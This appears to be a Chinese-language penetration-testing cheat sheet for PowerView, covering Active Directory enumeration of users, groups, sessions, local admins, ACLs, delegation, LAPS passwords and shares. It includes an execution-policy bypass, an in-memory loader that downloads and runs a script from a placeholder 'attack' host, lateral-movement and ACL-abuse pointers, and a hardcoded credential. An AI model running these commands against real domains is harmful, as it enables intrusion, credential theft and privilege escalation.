# PowerView

## PowerView是什么？

PowerView=手动版BloodHound

BloodHound：自动收集信息画线索图

PowerView：手动收集信息

## PowerView怎么加载

（1）直接加载ps1

Import-Module .\PowerView.ps1

执行策略

powershell -ep bypass

Import-Module .\PowerView.ps1

（2）内存加载

IEX (New-Object Net.WebClient).DownloadString('http://attack/PowerView.ps1')

### 怎么确认加载成功？

Get-Command -Module PowerView

## （1）枚举域/用户/组 <=> BloodHound：Group/MemberOf

Get-Doamin

### 1）所有域用户

Get-DomainUser

Get-DomainUser <user>

### 2）域组

Get-DomainGroup

Get-DomainGroup <Doamin Group>

### 3）组成员

Get-DomainGroupMember <Domain Member>

## （2）横向移动（Session/LocalAdmin）<=> BloodHound：AdminTo

### 1）谁登录在那台机器（Session）

Get-NetSession -ComputerName <computerName>

如果看到：

UserName : Administrator

证明打下这台机器就能拿到Administrator凭据

### 2）我是不是这台机的本地管理员（LocalAdmin）

Get-NetLocalGroupMember -ComputerName <computername>

如果在里面直接：

evil-winrm / psexec

## （3）权限/ACL <=> BloodHound ACL

### 1）查看对象ACL

Get-DomainObjectAcl -Identity <user>

自动找“有意思的权限”

Find-InterestingDomainAcl

GenericAll,WriteDacl,WriteOwner,ForceChangePassword

下一步就是：Add-DomainGroupMember/Add-DomainObjectAcl

## （4）委派/高级配置 <=> BloodHound ObjectProps

### 1）非约束委派

Get-DomainComputer -Unconstrained

### 2）约束委派

Get-DomainUser -TrustedToAuth

### 3）查LAPS

Get-DomainComputer -properties ms-Mcs-AdmPwd

## （5）PsCredential凭据

$pass = ConvertTo-SecureString 'aA12345677..' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PsCredential("administrator\BENJAMIN",$pass)

## （6）Find-DomainShare

1）详细输出share

Find-DomainShare -Verbose

2）强制检查当前凭据能访问的共享

Find-DomainShare -CheckShareAccess -Verbose

3）如果上面没输出，用Invoke-ShareFinder 主动扫描

Invoke-ShareFinder -CheckShareAccess -Verbose

4）排除默认共享，只看自定义的

Invoke-ShareFinder -ExcludeStandard -CheckShareAccess -Verbose

5）直接枚举特定主机（替代DC或文件服务路径）

Find-DomainShare -ComputerName DC01.administrator.local -CheckShareAccess

